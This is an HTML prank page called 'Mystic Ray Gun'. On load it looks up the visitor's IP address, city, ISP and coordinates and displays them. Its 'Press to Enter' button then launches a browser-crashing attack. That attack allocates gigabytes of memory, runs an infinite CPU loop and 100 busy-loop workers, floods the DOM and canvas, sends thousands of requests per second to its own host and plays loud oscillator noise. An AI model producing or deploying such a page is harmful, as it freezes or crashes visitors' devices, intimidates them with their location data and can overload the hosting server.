<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Mystic Ray Gun</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    html, body {
      width:100%; height:100%;
      background:#000;
      color:#eee;
      font-family: Consolas, monospace;
      overflow:hidden;
    }
    #wrapper {
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:center;
      height:100%;
      text-align:center;
      padding:20px;
    }
    h1 { font-size:3rem; margin-bottom:1rem; color:#f00; }
    #enter {
      padding:15px 30px;
      font-size:1.2rem;
      cursor:pointer;
      background:#ff0000;
      color:#fff;
      border:none;
      border-radius:5px;
      box-shadow: 0 0 10px #f00;
    }
    #enter:hover {
      background:#cc0000;
    }
    #info {
      margin-top:20px;
      text-align:left;
      font-size:1rem;
      white-space:pre-wrap;
      color:#0f0;
    }
    canvas {
      position:fixed;
      top:0; left:0;
      width:100vw; height:100vh;
      z-index:1000;
      pointer-events:none;
    }
    body.lag {
      background:url('https://media.discordapp.net/attachments/1383663897390612510/1388991866199871538/kUNLaxL.png') center/cover no-repeat fixed;
      color:#f00;
    }
    body.lag h1, body.lag #enter, body.lag #wrapper {
      display:none;
    }
  </style>
</head>
<body>
  <div id="wrapper">
    <h1>Mystic Ray Gun</h1>
    <button id="enter">Press to Enter</button>
    <div id="info">Getting your IP details...</div>
  </div>
  <canvas id="c"></canvas>

  <script>
    const infoEl = document.getElementById('info');

    // ✅ Get IP info WITHOUT a token
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        infoEl.textContent = 
          `🔎 IP: ${data.ip}\n` +
          `🌍 City: ${data.city}\n` +
          `🌐 Region: ${data.region}\n` +
          `🇺🇸 Country: ${data.country_name} (${data.country_code})\n` +
          `🏢 ISP: ${data.org}\n` +
          `🔧 ASN: ${data.asn}\n` +
          `📍 Coordinates: ${data.latitude}, ${data.longitude}`;
      })
      .catch(() => {
        infoEl.textContent = 'Could not fetch your IP info.';
      });

    document.getElementById('enter').onclick = () => {
      document.body.classList.add('lag');

      // Setup canvas
      const canvas = document.getElementById('c');
      const ctx = canvas.getContext('2d');
      function resize() {
        canvas.width = innerWidth;
        canvas.height = innerHeight;
      }
      resize();
      window.addEventListener('resize', resize);

      // RAM hog
      const memoryHog = [];
      const memInterval = setInterval(() => {
        try {
          memoryHog.push('a'.repeat(20 * 1024 * 1024));
        } catch {}
        if (memoryHog.length >= 1000) clearInterval(memInterval);
      }, 20);

      // Canvas spam
      setInterval(() => {
        for(let i=0;i<30000;i++) {
          ctx.fillStyle = `hsl(${Math.random()*360},100%,50%)`;
          ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 10, 10);
        }
      }, 10);

      // DOM spam
      setInterval(() => {
        for(let i=0;i<500;i++) {
          const d = document.createElement('div');
          d.style.position = 'fixed';
          d.style.left = `${Math.random()*100}vw`;
          d.style.top = `${Math.random()*100}vh`;
          d.style.fontSize = `${5 + Math.random() * 20}px`;
          d.style.color = `hsl(${Math.random()*360},100%,50%)`;
          d.textContent = '💀'.repeat(20);
          document.body.appendChild(d);
        }
      }, 10);

      // CPU brutal loop
      setTimeout(() => {
        while(true){
          Math.pow(Math.random(), Math.random()) * Math.sin(Math.random() * 99999);
        }
      }, 1000);

      // Workers
      for(let i=0; i<100; i++) {
        new Worker(URL.createObjectURL(new Blob([`
          while(true) {
            Math.random() + Math.pow(99, 99);
          }
        `], { type: 'application/javascript' })));
      }

      // Fetch flood
      setInterval(() => {
        for(let i=0;i<1500;i++){
          fetch(location.href + '?q=' + Math.random()).catch(() => {});
        }
      }, 5);

      // Audio
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      setInterval(() => {
        const osc = audioCtx.createOscillator();
        osc.type = 'sawtooth';
        osc.frequency.setValueAtTime(400 + Math.random()*2500, audioCtx.currentTime);
        osc.connect(audioCtx.destination);
        osc.start();
        osc.stop(audioCtx.currentTime + 0.1);
      }, 15);

      // Shake/glitch
      let shake = 20;
      const doShake = () => {
        const x = (Math.random() - 0.5) * shake;
        const y = (Math.random() - 0.5) * shake;
        canvas.style.transform = `translate(${x}px, ${y}px)`;
        shake *= 0.98;
        requestAnimationFrame(doShake);
      };
      doShake();
    };
  </script>
</body>
</html>
